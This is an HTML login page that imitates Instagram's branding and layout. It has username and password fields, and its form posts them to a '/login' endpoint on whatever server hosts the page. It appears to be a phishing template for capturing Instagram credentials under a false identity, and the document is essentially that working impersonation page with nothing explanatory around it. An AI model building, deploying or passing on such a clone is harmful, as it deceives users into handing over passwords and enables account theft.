<!DOCTYPE html>
<html lang="en">

<meta charset="UTF-8">

<title>Instagram</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#fafafa;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
min-height:100vh;display:flex;align-items:center;justify-content:center}
.card{background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:40px;
width:350px;text-align:center}
.logo{font-family:'Billabong',cursive,serif;font-size:2.8rem;margin-bottom:20px;
background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);
-webkit-background-clip:text;-webkit-text-fill-color:transparent;
background-clip:text;font-weight:400}
.sep{display:flex;align-items:center;margin:16px 0;gap:16px}
.sep .line{flex:1;height:1px;background:#dbdbdb}
.sep span{color:#8e8e8e;font-size:13px;font-weight:600;text-transform:uppercase}
input{width:100%;padding:9px 0 7px 8px;background:#fafafa;border:1px solid #dbdbdb;
border-radius:3px;font-size:12px;margin-bottom:6px;outline:none;color:#262626}
input:focus{border-color:#a8a8a8}
.btn{width:100%;padding:7px;background:#0095f6;color:#fff;border:none;
border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;margin-top:8px}
.btn:hover{background:#1877f2}
.forgot{display:block;margin-top:14px;color:#00376b;font-size:12px;text-decoration:none}
.signup{background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:16px;
width:350px;text-align:center;margin-top:10px;font-size:14px;color:#262626}
.signup a{color:#0095f6;font-weight:600;text-decoration:none}
.get{text-align:center;margin-top:16px;font-size:14px;color:#262626}
.badges{display:flex;justify-content:center;gap:8px;margin-top:12px}
</style>
</head>
<body>
<div>
<div class="card">
<div class="logo">Instagram</div>
<form method="POST" action="/login">
<input type="text" name="username" data-i18n-ph="user_ph" placeholder="Phone number, username or email" required autocomplete="off">
<input type="password" name="password" data-i18n-ph="pass_ph" placeholder="Password" required>
<button type="submit" class="btn" data-i18n="login">Log in</button>
</form>
<div class="sep"><div class="line"></div><span data-i18n="or">OR</span><div class="line"></div></div>
<a href="#" class="forgot" data-i18n="forgot">Forgotten your password?</a>
</div>
<div class="signup"><span data-i18n="no_account">Don't have an account?</span> <a href="#" data-i18n="signup">Sign up</a></div>
<div class="get" data-i18n="get_app">Get the app.</div>
